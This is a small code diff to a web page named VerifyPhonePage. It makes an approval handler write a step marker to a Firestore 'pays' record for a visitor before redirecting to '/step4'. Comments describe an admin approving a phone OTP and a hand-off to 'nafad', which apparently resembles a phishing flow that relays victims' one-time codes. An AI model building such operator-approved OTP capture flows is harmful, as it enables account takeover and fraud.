@@ -209,7 +209,7 @@ export default function VerifyPhonePage() {
     }
   };
 
-  const handleApproved = () => {
+  const handleApproved = async () => {
     // Admin approved phone OTP - close waiting modal and navigate to nafad
     console.log("[step5] Phone OTP approved, navigating to nafad");
 
@@ -217,6 +217,15 @@ export default function VerifyPhonePage() {
     setShowStcModal(false);
     setShowMobilyModal(false);
     setShowCarrierModal(false);
+
+    // Update currentStep before redirecting to prevent loop
+    if (visitorId && db) {
+      await setDoc(
+        doc(db as Firestore, "pays", visitorId),
+        { currentStep: "_t6" },
+        { merge: true }
+      );
+    }
 
     // Navigate to nafad page
     window.location.href = "/step4";
